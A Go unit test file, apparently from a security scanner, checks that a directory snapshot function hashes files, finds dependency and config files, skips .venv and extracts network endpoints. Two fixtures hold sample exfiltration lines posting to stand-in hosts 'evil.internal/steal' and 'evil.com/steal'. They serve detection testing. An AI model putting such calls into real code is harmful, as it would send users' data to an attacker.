// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package watcher

import (
	"os"
	"path/filepath"
	"testing"
)

func TestSnapshotTarget_Empty(t *testing.T) {
	dir := t.TempDir()
	snap, err := SnapshotTarget(dir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if snap.ContentHash == "" {
		t.Error("expected non-empty content hash for empty dir")
	}
	if len(snap.DependencyHashes) != 0 {
		t.Errorf("expected no dependency hashes, got %d", len(snap.DependencyHashes))
	}
	if len(snap.ConfigHashes) != 0 {
		t.Errorf("expected no config hashes, got %d", len(snap.ConfigHashes))
	}
	if len(snap.NetworkEndpoints) != 0 {
		t.Errorf("expected no network endpoints, got %d", len(snap.NetworkEndpoints))
	}
}

func TestSnapshotTarget_DetectsDeps(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "requirements.txt"), []byte("flask==3.0\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"name":"test"}`), 0o600); err != nil {
		t.Fatal(err)
	}

	snap, err := SnapshotTarget(dir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(snap.DependencyHashes) != 2 {
		t.Errorf("expected 2 dependency hashes, got %d", len(snap.DependencyHashes))
	}
	if _, ok := snap.DependencyHashes["requirements.txt"]; !ok {
		t.Error("expected requirements.txt in dependency hashes")
	}
	if _, ok := snap.DependencyHashes["package.json"]; !ok {
		t.Error("expected package.json in dependency hashes")
	}
}

func TestSnapshotTarget_DetectsConfig(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "skill.yaml"), []byte("name: test\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "config.json"), []byte("{}"), 0o600); err != nil {
		t.Fatal(err)
	}

	snap, err := SnapshotTarget(dir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(snap.ConfigHashes) != 2 {
		t.Errorf("expected 2 config hashes, got %d", len(snap.ConfigHashes))
	}
}

func TestSnapshotTarget_ExtractsEndpoints(t *testing.T) {
	dir := t.TempDir()
	code := `
import requests
r = requests.get("https://api.example.org/v1/data")
r2 = requests.post("http://evil.internal:8080/steal")
`
	if err := os.WriteFile(filepath.Join(dir, "main.py"), []byte(code), 0o600); err != nil {
		t.Fatal(err)
	}

	snap, err := SnapshotTarget(dir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(snap.NetworkEndpoints) < 2 {
		t.Errorf("expected at least 2 endpoints, got %d: %v", len(snap.NetworkEndpoints), snap.NetworkEndpoints)
	}

	found := make(map[string]bool)
	for _, ep := range snap.NetworkEndpoints {
		found[ep] = true
	}
	if !found["https://api.example.org/v1/data"] {
		t.Error("expected https://api.example.org/v1/data in endpoints")
	}
	if !found["http://evil.internal:8080/steal"] {
		t.Error("expected http://evil.internal:8080/steal in endpoints")
	}
}

func TestSnapshotTarget_SkipsVenvDir(t *testing.T) {
	dir := t.TempDir()
	venvDir := filepath.Join(dir, ".venv")
	if err := os.MkdirAll(venvDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(venvDir, "pyvenv.cfg"), []byte("home = /usr/bin"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "main.py"), []byte("print('hello')"), 0o600); err != nil {
		t.Fatal(err)
	}

	snap1, err := SnapshotTarget(dir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if err := os.WriteFile(filepath.Join(venvDir, "newfile"), []byte("changed"), 0o600); err != nil {
		t.Fatal(err)
	}

	snap2, err := SnapshotTarget(dir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if snap1.ContentHash != snap2.ContentHash {
		t.Error("content hash should not change when only .venv contents change")
	}
}

func TestSnapshotTarget_DeterministicHash(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "a.py"), []byte("print(1)"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "b.py"), []byte("print(2)"), 0o600); err != nil {
		t.Fatal(err)
	}

	snap1, _ := SnapshotTarget(dir)
	snap2, _ := SnapshotTarget(dir)

	if snap1.ContentHash != snap2.ContentHash {
		t.Error("snapshot hashes should be deterministic")
	}
}

func TestSnapshotTarget_ContentChangeAltersHash(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.py"), []byte("v1"), 0o600); err != nil {
		t.Fatal(err)
	}

	snap1, _ := SnapshotTarget(dir)

	if err := os.WriteFile(filepath.Join(dir, "main.py"), []byte("v2"), 0o600); err != nil {
		t.Fatal(err)
	}

	snap2, _ := SnapshotTarget(dir)

	if snap1.ContentHash == snap2.ContentHash {
		t.Error("content hash should change when file content changes")
	}
}

func TestSnapshotTarget_IgnoresLocalhost(t *testing.T) {
	dir := t.TempDir()
	code := `url = "http://localhost:3000/api"
other = "https://evil.com/steal"
`
	if err := os.WriteFile(filepath.Join(dir, "app.js"), []byte(code), 0o600); err != nil {
		t.Fatal(err)
	}

	snap, _ := SnapshotTarget(dir)

	for _, ep := range snap.NetworkEndpoints {
		if ep == "http://localhost" || ep == "http://localhost:3000/api" {
			t.Errorf("localhost endpoints should be ignored, got: %s", ep)
		}
	}
}
